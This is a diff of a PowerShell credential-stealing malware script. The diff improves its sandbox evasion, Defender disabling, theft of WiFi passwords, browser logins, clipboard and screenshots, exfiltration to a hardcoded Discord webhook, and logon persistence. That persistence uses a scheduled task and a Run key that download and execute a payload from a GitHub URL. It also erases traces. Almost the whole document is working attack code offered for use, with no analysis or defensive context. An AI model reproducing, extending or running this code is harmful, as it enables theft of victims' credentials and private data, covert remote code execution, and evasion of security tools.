@@ -7,7 +7,7 @@
 
 # Configuration
 $webhookUrl = "https://discord.com/api/webhooks/1438102665900068966/IW_cUGLJMcqk9A8vHVlW-ELAjSSddZjFWJgmOKaVZgyHzO1QQPSiwUCmINI10blwstec"
-$sleepTime = 3  # Seconds to wait between operations
+$delayBetweenMessages = 2  # Seconds to wait between Discord messages
 
 # ================================================================
 # EVASION: Disable Windows Defender (Requires Admin)
@@ -18,39 +18,61 @@ function Disable-Defender {
         Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
         Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
         Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
-        return "Defender disabled successfully"
+        return "✅ Defender disabled"
     }
     catch {
-        return "Defender disable failed (may not have admin rights)"
+        return "❌ Defender disable failed (no admin rights)"
     }
 }
 
 # ================================================================
-# EVASION: Check for VM/Sandbox
+# EVASION: Check for VM/Sandbox (IMPROVED)
 # ================================================================
 function Test-Sandbox {
+    $score = 0
     $indicators = @()
     
     # Check for VM artifacts
     $vm = Get-WmiObject Win32_ComputerSystem
-    if ($vm.Manufacturer -match "VMware|VirtualBox|Xen|QEMU") {
-        $indicators += "VM detected: $($vm.Manufacturer)"
+    if ($vm.Manufacturer -match "VMware|VirtualBox|Xen|QEMU|Microsoft Corporation") {
+        $score += 3
+        $indicators += "VM Manufacturer: $($vm.Manufacturer)"
     }
     
-    # Check for low RAM (common in sandboxes)
-    if ($vm.TotalPhysicalMemory -lt 4GB) {
-        $indicators += "Low RAM: $([math]::Round($vm.TotalPhysicalMemory/1GB,2))GB"
+    # Check for very low RAM (sandboxes typically have <2GB)
+    $ramGB = [math]::Round($vm.TotalPhysicalMemory/1GB,2)
+    if ($ramGB -lt 2) {
+        $score += 2
+        $indicators += "Suspicious RAM: ${ramGB}GB"
     }
     
-    # Check for sandbox processes
-    $sandboxProcs = Get-Process | Where-Object {
-        $_.Name -match "vbox|vmware|vmsrvc|vmusrvc|python|fiddler|wireshark"
-    }
-    if ($sandboxProcs) {
-        $indicators += "Sandbox processes: $($sandboxProcs.Name -join ', ')"
+    # Check for specific sandbox/analysis processes (more specific)
+    $suspiciousProcs = @('vboxservice', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'vmwareuser', 
+                         'vmsrvc', 'vmusrvc', 'prl_tools', 'prl_cc', 'xenservice', 
+                         'qemu-ga', 'wireshark', 'fiddler', 'processhacker', 'procmon')
+    
+    $foundProcs = Get-Process | Where-Object {
+        $procName = $_.Name.ToLower()
+        $suspiciousProcs -contains $procName
     }
     
-    return $indicators
+    if ($foundProcs) {
+        $score += 2
+        $indicators += "Sandbox processes: $($foundProcs.Name -join ', ')"
+    }
+    
+    # Check for known sandbox usernames
+    if ($env:USERNAME -match "sandbox|malware|virus|test|analyst") {
+        $score += 2
+        $indicators += "Suspicious username: $env:USERNAME"
+    }
+    
+    # Only abort if score is 4+ (multiple indicators)
+    return @{
+        IsSandbox = ($score -ge 4)
+        Score = $score
+        Indicators = $indicators
+    }
 }
 
 # ================================================================
@@ -62,7 +84,8 @@ function Get-SystemInfo {
     $bios = Get-WmiObject Win32_BIOS
     
     $info = @"
-=== SYSTEM INFORMATION ===
+**🖥️ SYSTEM INFORMATION**
+\`\`\`
 Computer Name: $env:COMPUTERNAME
 Username: $env:USERNAME
 Full Name: $(([Security.Principal.WindowsIdentity]::GetCurrent()).Name)
@@ -75,10 +98,11 @@ Manufacturer: $($cs.Manufacturer)
 Model: $($cs.Model)
 Serial: $($bios.SerialNumber)
 RAM: $([math]::Round($cs.TotalPhysicalMemory/1GB,2))GB
-Processor: $($cs.NumberOfProcessors) x $env:PROCESSOR_IDENTIFIER
+Processor: $env:PROCESSOR_IDENTIFIER
 Domain: $($cs.Domain)
 Time Zone: $(Get-TimeZone).DisplayName
 Current Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+\`\`\`
 "@
     return $info
 }
@@ -87,7 +111,7 @@ Current Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
 # DATA COLLECTION: Network Information
 # ================================================================
 function Get-NetworkInfo {
-    $info = "`n=== NETWORK INFORMATION ==="
+    $info = "**🌐 NETWORK INFORMATION**`n``````"
     
     # IP Addresses
     $adapters = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
@@ -114,15 +138,7 @@ function Get-NetworkInfo {
         $info += "`n`nPublic IP: Could not retrieve"
     }
     
-    # DNS Servers
-    $dns = Get-DnsClientServerAddress -AddressFamily IPv4 | Where-Object {
-        $_.ServerAddresses.Count -gt 0
-    }
-    $info += "`n`nDNS Servers:"
-    foreach ($d in $dns) {
-        $info += "`n  $($d.InterfaceAlias): $($d.ServerAddresses -join ', ')"
-    }
-    
+    $info += "``````"
     return $info
 }
 
@@ -130,31 +146,34 @@ function Get-NetworkInfo {
 # DATA COLLECTION: WiFi Passwords
 # ================================================================
 function Get-WiFiPasswords {
-    $info = "`n`n=== SAVED WIFI PASSWORDS ==="
+    $info = "**🔑 SAVED WIFI PASSWORDS**`n``````"
     
     try {
         $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
             ($_ -split ":")[-1].Trim()
         }
         
+        $count = 0
         foreach ($profile in $profiles) {
             $passInfo = netsh wlan show profile name="$profile" key=clear
             $password = ($passInfo | Select-String "Key Content") -replace ".*: ", ""
             
             if ($password) {
-                $info += "`n  Network: $profile"
-                $info += "`n  Password: $password`n"
+                $info += "`nNetwork: $profile"
+                $info += "`nPassword: $password`n"
+                $count++
             }
         }
         
-        if ($profiles.Count -eq 0) {
-            $info += "`n  No saved WiFi networks found"
+        if ($count -eq 0) {
+            $info += "`nNo saved WiFi networks found"
         }
     }
     catch {
-        $info += "`n  Failed to retrieve WiFi passwords"
+        $info += "`nFailed to retrieve WiFi passwords"
     }
     
+    $info += "``````"
     return $info
 }
 
@@ -162,7 +181,7 @@ function Get-WiFiPasswords {
 # DATA COLLECTION: Browser Data
 # ================================================================
 function Get-BrowserData {
-    $info = "`n`n=== BROWSER DATA ==="
+    $info = "**🌐 BROWSER DATA**`n``````"
     
     # Chrome/Edge History
     $browsers = @(
@@ -178,10 +197,10 @@ function Get-BrowserData {
             try {
                 $tempHist = "$env:TEMP\$($browser.Name)_hist_$(Get-Random).db"
                 Copy-Item $histPath $tempHist -ErrorAction Stop
-                $info += "`n`n$($browser.Name) History: Captured ($tempHist)"
+                $info += "`n$($browser.Name) History: ✅ Captured"
             }
             catch {
-                $info += "`n`n$($browser.Name) History: Locked (browser open)"
+                $info += "`n$($browser.Name) History: ❌ Locked (browser open)"
             }
         }
         
@@ -189,10 +208,10 @@ function Get-BrowserData {
             try {
                 $tempLogin = "$env:TEMP\$($browser.Name)_login_$(Get-Random).db"
                 Copy-Item $loginPath $tempLogin -ErrorAction Stop
-                $info += "`n$($browser.Name) Passwords: Captured ($tempLogin)"
+                $info += "`n$($browser.Name) Passwords: ✅ Captured"
             }
             catch {
-                $info += "`n$($browser.Name) Passwords: Locked (browser open)"
+                $info += "`n$($browser.Name) Passwords: ❌ Locked"
             }
         }
     }
@@ -202,32 +221,20 @@ function Get-BrowserData {
     if (Test-Path $ffProfiles) {
         Get-ChildItem $ffProfiles -Directory | ForEach-Object {
             $places = Join-Path $_.FullName "places.sqlite"
-            $logins = Join-Path $_.FullName "logins.json"
-            
             if (Test-Path $places) {
                 try {
                     $tempPlaces = "$env:TEMP\ff_places_$(Get-Random).db"
                     Copy-Item $places $tempPlaces -ErrorAction Stop
-                    $info += "`n`nFirefox History: Captured ($tempPlaces)"
+                    $info += "`nFirefox History: ✅ Captured"
                 }
                 catch {
-                    $info += "`n`nFirefox History: Locked"
-                }
-            }
-            
-            if (Test-Path $logins) {
-                try {
-                    $tempLogins = "$env:TEMP\ff_logins_$(Get-Random).json"
-                    Copy-Item $logins $tempLogins -ErrorAction Stop
-                    $info += "`nFirefox Passwords: Captured ($tempLogins)"
-                }
-                catch {
-                    $info += "`nFirefox Passwords: Locked"
+                    $info += "`nFirefox History: ❌ Locked"
                 }
             }
         }
     }
     
+    $info += "``````"
     return $info
 }
 
@@ -235,23 +242,27 @@ function Get-BrowserData {
 # DATA COLLECTION: Clipboard
 # ================================================================
 function Get-ClipboardData {
-    $info = "`n`n=== CLIPBOARD CONTENT ==="
+    $info = "**📋 CLIPBOARD**`n``````"
     
     try {
         Add-Type -AssemblyName System.Windows.Forms
         $clip = [System.Windows.Forms.Clipboard]::GetText()
         
         if ($clip -and $clip.Length -gt 0) {
+            if ($clip.Length -gt 500) {
+                $clip = $clip.Substring(0, 500) + "... (truncated)"
+            }
             $info += "`n$clip"
         }
         else {
-            $info += "`n  (Empty)"
+            $info += "`n(Empty)"
         }
     }
     catch {
-        $info += "`n  Failed to retrieve clipboard"
+        $info += "`nFailed to retrieve"
     }
     
+    $info += "``````"
     return $info
 }
 
@@ -259,42 +270,22 @@ function Get-ClipboardData {
 # DATA COLLECTION: Recent Files
 # ================================================================
 function Get-RecentFiles {
-    $info = "`n`n=== RECENT FILES ==="
+    $info = "**📁 RECENT FILES (Last 15)**`n``````"
     
     try {
         $recent = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -File |
             Sort-Object LastWriteTime -Descending |
-            Select-Object -First 20
+            Select-Object -First 15
         
         foreach ($file in $recent) {
-            $target = $file.FullName
-            if ($file.Extension -eq ".lnk") {
-                $shell = New-Object -ComObject WScript.Shell
-                $target = $shell.CreateShortcut($file.FullName).TargetPath
-            }
-            $info += "`n  [$($file.LastWriteTime)] $target"
+            $info += "`n[$($file.LastWriteTime.ToString('MM/dd HH:mm'))] $($file.Name)"
         }
     }
     catch {
-        $info += "`n  Failed to retrieve recent files"
+        $info += "`nFailed to retrieve recent files"
     }
     
-    return $info
-}
-
-# ================================================================
-# DATA COLLECTION: Running Processes
-# ================================================================
-function Get-ProcessInfo {
-    $info = "`n`n=== RUNNING PROCESSES (Top 20 by Memory) ==="
-    
-    $procs = Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 20
-    
-    foreach ($proc in $procs) {
-        $memMB = [math]::Round($proc.WorkingSet / 1MB, 2)
-        $info += "`n  $($proc.Name) (PID: $($proc.Id)) - ${memMB}MB"
-    }
-    
+    $info += "``````"
     return $info
 }
 
@@ -325,57 +316,45 @@ function Get-Screenshot {
 }
 
 # ================================================================
-# DATA COLLECTION: Webcam Photo (if available)
-# ================================================================
-function Get-WebcamPhoto {
-    try {
-        # This requires additional setup and isn't always reliable
-        # Skipping for now to keep payload size reasonable
-        return $null
-    }
-    catch {
-        return $null
-    }
-}
-
-# ================================================================
 # PERSISTENCE: Create Scheduled Task
 # ================================================================
 function Install-Persistence {
-    $info = "`n`n=== PERSISTENCE ==="
+    $info = "**🔄 PERSISTENCE**`n``````"
     
     try {
         $taskName = "WindowsUpdateCheck"
-        $scriptPath = "$env:APPDATA\Microsoft\Windows\wupdate.ps1"
+        $scriptUrl = "https://raw.githubusercontent.com/SaturnJZX/Security-test/refs/heads/main/payload.ps1"
         
-        # Copy this script to persistent location
-        Copy-Item $PSCommandPath $scriptPath -Force -ErrorAction Stop
+        # Create PowerShell command that downloads and executes
+        $psCommand = "iex(iwr '$scriptUrl' -UseBasicParsing).Content"
         
         # Create scheduled task
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$psCommand`""
         $trigger = New-ScheduledTaskTrigger -AtLogOn
-        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries
+        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 10)
         
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
         
-        $info += "`n  Scheduled Task Created: $taskName"
-        $info += "`n  Payload Location: $scriptPath"
-        $info += "`n  Trigger: At user logon"
+        $info += "`n✅ Scheduled Task: $taskName"
+        $info += "`n✅ Trigger: At user logon"
+        $info += "`n✅ Action: Download and execute from GitHub"
     }
     catch {
-        $info += "`n  Failed to create persistence (may need admin)"
+        $info += "`n❌ Failed (may need admin rights)"
     }
     
-    # Registry Run key (alternative)
+    # Registry Run key (backup method)
     try {
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        Set-ItemProperty -Path $regPath -Name "WindowsUpdateCheck" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -ErrorAction Stop
-        $info += "`n  Registry Run Key Created"
+        $psCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex(iwr 'https://raw.githubusercontent.com/SaturnJZX/Security-test/refs/heads/main/payload.ps1' -UseBasicParsing).Content`""
+        Set-ItemProperty -Path $regPath -Name "WindowsUpdateCheck" -Value $psCommand -ErrorAction Stop
+        $info += "`n✅ Registry Run Key: Created"
     }
     catch {
-        $info += "`n  Registry persistence failed"
+        $info += "`n❌ Registry: Failed"
     }
     
+    $info += "``````"
     return $info
 }
 
@@ -418,6 +397,7 @@ function Send-ToDiscord {
         return $true
     }
     catch {
+        Write-Host "Discord send failed: $_"
         return $false
     }
 }
@@ -433,18 +413,15 @@ function Clear-Traces {
         # Clear Run dialog history
         Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
         
-        # Clear recent files
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
-        
         # Clear temp files created by this script
         Get-ChildItem $env:TEMP | Where-Object {
-            $_.Name -like "*hist_*" -or $_.Name -like "*login_*" -or $_.Name -like "*sc_*"
+            $_.Name -like "*hist_*" -or $_.Name -like "*login_*" -or $_.Name -like "*sc_*" -or $_.Name -like "*places_*"
         } | Remove-Item -Force -ErrorAction SilentlyContinue
         
-        return "`n`n=== CLEANUP ===`n  Traces cleared successfully"
+        return "**✅ CLEANUP COMPLETE**`n``````Traces cleared successfully``````"
     }
     catch {
-        return "`n`n=== CLEANUP ===`n  Some traces may remain"
+        return "**⚠️ CLEANUP**`n``````Some traces may remain``````"
     }
 }
 
@@ -452,56 +429,72 @@ function Clear-Traces {
 # MAIN EXECUTION
 # ================================================================
 
-# Check for sandbox/VM
+# Check for sandbox/VM (improved detection)
 $sandboxCheck = Test-Sandbox
-if ($sandboxCheck.Count -gt 0) {
-    Send-ToDiscord -Message "⚠️ SANDBOX DETECTED - Aborting`n$($sandboxCheck -join "`n")"
+if ($sandboxCheck.IsSandbox) {
+    $msg = "⚠️ **SANDBOX DETECTED - ABORTING**`n``````Score: $($sandboxCheck.Score)/10`n$($sandboxCheck.Indicators -join "`n")``````"
+    Send-ToDiscord -Message $msg
     exit
 }
 
+# Send initial notification
+Send-ToDiscord -Message "🎯 **NEW INFECTION DETECTED** 🎯`n*Beginning data collection...*"
+Start-Sleep -Seconds $delayBetweenMessages
+
 # Attempt to disable Defender
 $defenderStatus = Disable-Defender
-Start-Sleep -Seconds $sleepTime
 
-# Collect all data
-$allData = ""
-$allData += Get-SystemInfo
-Start-Sleep -Seconds 1
-$allData += Get-NetworkInfo
-Start-Sleep -Seconds 1
-$allData += Get-WiFiPasswords
-Start-Sleep -Seconds 1
-$allData += Get-BrowserData
-Start-Sleep -Seconds 1
-$allData += Get-ClipboardData
-Start-Sleep -Seconds 1
-$allData += Get-RecentFiles
-Start-Sleep -Seconds 1
-$allData += Get-ProcessInfo
-Start-Sleep -Seconds 1
+# Collect and send system info
+$sysInfo = Get-SystemInfo
+Send-ToDiscord -Message $sysInfo
+Start-Sleep -Seconds $delayBetweenMessages
 
-# Add persistence
-$persistenceStatus = Install-Persistence
-$allData += $persistenceStatus
+# Collect and send network info
+$netInfo = Get-NetworkInfo
+Send-ToDiscord -Message $netInfo
+Start-Sleep -Seconds $delayBetweenMessages
 
-# Add defender status
-$allData += "`n`n=== DEFENDER STATUS ===`n  $defenderStatus"
+# Collect and send WiFi passwords
+$wifiInfo = Get-WiFiPasswords
+Send-ToDiscord -Message $wifiInfo
+Start-Sleep -Seconds $delayBetweenMessages
 
-# Take screenshot
+# Collect and send browser data
+$browserInfo = Get-BrowserData
+Send-ToDiscord -Message $browserInfo
+Start-Sleep -Seconds $delayBetweenMessages
+
+# Collect and send clipboard
+$clipInfo = Get-ClipboardData
+Send-ToDiscord -Message $clipInfo
+Start-Sleep -Seconds $delayBetweenMessages
+
+# Collect and send recent files
+$recentInfo = Get-RecentFiles
+Send-ToDiscord -Message $recentInfo
+Start-Sleep -Seconds $delayBetweenMessages
+
+# Install persistence
+$persistInfo = Install-Persistence
+Send-ToDiscord -Message $persistInfo
+Start-Sleep -Seconds $delayBetweenMessages
+
+# Send Defender status
+Send-ToDiscord -Message "**🛡️ DEFENDER STATUS**`n``````$defenderStatus``````"
+Start-Sleep -Seconds $delayBetweenMessages
+
+# Take and send screenshot
 $screenshot = Get-Screenshot
-
-# Send data to Discord
-Send-ToDiscord -Message "🎯 **NEW INFECTION** 🎯`n``````$allData``````"
-Start-Sleep -Seconds 2
-
 if ($screenshot) {
-    Send-ToDiscord -Message "📸 Screenshot captured" -FilePath $screenshot
+    Send-ToDiscord -Message "📸 **Screenshot captured**" -FilePath $screenshot
     Remove-Item $screenshot -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds $delayBetweenMessages
 }
 
 # Cleanup traces
 $cleanupStatus = Clear-Traces
 Send-ToDiscord -Message $cleanupStatus
+Start-Sleep -Seconds $delayBetweenMessages
 
 # Final message
-Send-ToDiscord -Message "✅ **Data exfiltration complete** - Persistence installed - System will report again at next logon"
+Send-ToDiscord -Message "✅ **EXFILTRATION COMPLETE**`n*Persistence installed - will execute again at next logon*"
